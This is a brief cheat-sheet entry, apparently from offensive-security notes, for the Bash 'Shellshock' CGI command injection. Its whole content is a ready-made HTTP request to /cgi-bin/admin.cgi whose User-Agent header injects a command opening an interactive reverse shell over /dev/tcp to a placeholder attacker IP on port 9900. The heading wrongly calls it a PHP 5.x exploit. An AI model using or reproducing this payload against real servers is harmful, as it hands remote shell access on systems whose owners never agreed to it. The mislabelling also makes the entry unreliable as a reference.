## CVE


### CGI

Bash - 'Shellshock' Environment Variables Command Injection

```bash
PHP 5.x Shellshock Exploit

GET /cgi-bin/admin.cgi HTTP/1.1
User-Agent: () { :;}; /bin/bash -c "/bin/sh -i >& /dev/tcp/<ip>/9900 0>&1"
```



